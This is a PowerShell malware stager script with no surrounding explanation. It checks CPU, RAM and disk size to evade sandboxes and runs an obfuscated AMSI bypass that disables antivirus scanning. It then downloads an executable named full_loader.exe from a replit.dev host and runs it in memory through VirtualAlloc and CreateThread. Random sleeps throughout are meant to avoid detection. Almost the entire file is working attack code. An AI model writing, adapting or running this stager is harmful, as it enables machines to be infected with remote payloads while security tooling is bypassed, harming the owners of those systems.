# polymorphic_stager_with_random_sleep.ps1
function check-environment {
    # Check CPU Cores
    $cpu = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors
    if ($cpu -lt 2) {
        Write-Host "[-] CPU cores too low. Exiting..."
        Start-Sleep -Seconds 3600
        exit
    }

    # Check RAM Size
    $ram = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    if ($ram -lt 4) {
        Write-Host "[-] RAM size too small. Exiting..."
        Start-Sleep -Seconds 3600
        exit
    }

    # Check Disk Size
    $disk = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB
    if ($disk -lt 60) {
        Write-Host "[-] Disk size too small. Exiting..."
        Start-Sleep -Seconds 3600
        exit
    }

    # Random sleep to appear legit
    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
}

# Call environment check before doing anything
check-environment

function rand-sleep {
    $rand = Get-Random -Minimum 2 -Maximum 7
    Start-Sleep -Seconds $rand
}

# Randomized AMSI Bypass
$a1='S'+'ystem.Manag'+'ement.Automation.AmsiUt'+'ils';
$a2='a'+'msiIni'+'tFailed';
$t=[Ref].Assembly.GetType([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($a1)))))
$f=$t.GetField([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($a2)))), 'NonPublic,Static')
$f.SetValue($null, $true)

rand-sleep

# Download and Execute
$u = "https://"+"87eed37d-b1e2-4a0a-815a-657e0af9f4ec-00-yc9214lbtpvl.janeway.replit.dev/download"+"/full_loader.exe"

$w=New-Object Net.WebClient

rand-sleep

$b64=[Convert]::ToBase64String($w.DownloadData($u))

rand-sleep

$by=[Convert]::FromBase64String($b64)

rand-sleep

$k=Add-Type -memberDefinition @"
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
"@ -Name "k32" -Namespace "x" -PassThru

$m=[x.k32]::VirtualAlloc(0,$by.Length,0x3000,0x40)

rand-sleep

[System.Runtime.InteropServices.Marshal]::Copy($by,0,$m,$by.Length)

rand-sleep

$t=Add-Type -memberDefinition @"
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,uint dwStackSize,IntPtr lpStartAddress,IntPtr lpParameter,uint dwCreationFlags,IntPtr lpThreadId);
"@ -Name "th32" -Namespace "x" -PassThru

[x.th32]::CreateThread(0,0,$m,0,0,0)

# Final fake idle
Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 600)
